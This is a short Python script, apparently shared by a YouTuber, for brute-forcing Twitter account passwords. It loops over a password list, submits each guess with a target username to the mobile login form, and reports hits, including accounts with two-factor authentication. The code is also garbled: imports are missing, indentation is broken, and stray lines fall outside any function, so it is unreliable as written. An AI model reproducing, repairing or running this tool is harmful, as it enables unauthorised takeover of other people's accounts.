#!/usr/bin/python


print('''\033[1;36m
    .'``.``.
 __/ (o) `, `.
'-=`,     ;   `.
    \    :      `-.
    /    ';        `.
   /      .'         `.
   |     (      `.     `-.._
    \     \` ` `. \         `-.._
     `.   ;`-.._ `-`._.-. `-._   `-._
       `..'     `-.```.  `-._ `-.._.'
         `--..__..-`--'      `-.,'
            `._)`/
             /--(
          -./,--'`-,
       ,^--(                    
       ,--' `-,           
        **************************************
        * -> Autor: Gilmar Filho             *
        **************************************
        * -> Youtuber                        *
        **************************************                                                 
\033[1;m''')

b = mechanize.Browser()
b.set_handle_equiv(True)
b.set_handle_gzip(True)
b.set_handle_redirect(True)
b.set_handle_referer(True)
b.set_handle_robots(False)
b._factory.is_html = True

b.addheaders = [('User-agent',
                 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Mobile Safari/537.36'
                 )]

username = input('\033[1;37musername: \033[1;37m')
passwordList = input('\033[1;37mpassword : \033[1;37m')
 logging.basicConfig()
    try:
    
def Twitter():
    password = open(passwordList).read().splitlines()
    try_login = 0
    print("\033[1;31mTarget Account: {}\033[1;31m".format(username))
    for password in password:
        try_login += 1
        if try_login == 10:
            try_login = 0
        sys.stdout.write('\r[-] {} [-] '.format(password))
        sys.stdout.flush()
        url = "https://mobile.twitter.com/i/flow/login"
        try:
            response = b.open(url, timeout=2)
            b.select_form(nr=0)
            b.form['session[username_or_email]'] = username
            b.form['session[password]'] = password
            b.method = "POST"
            response = b.submit()

            if len(response.geturl()) == 27:
                print(f'\n\033[1;31m [+] Senha Correta ^_^ [{username}]:[{password}] [+] \033[1;31m')
                break
            elif response.geturl() == "https://mobile.twitter.com/i/flow/login":
                print(f'\n\033[1;31m [+] Senha Correta ^_^ [{username}]:[{password}] [+] --> But There is a 2FA \033[1;31m')
            else:
                  print('\033[1;37m NO !\033[1;37m')
        except KeyboardInterrupt:
            print('\n ok exit ')break
            
if __name__ == '__main__':
    Twitter()
            sys.stdout.flush()
            
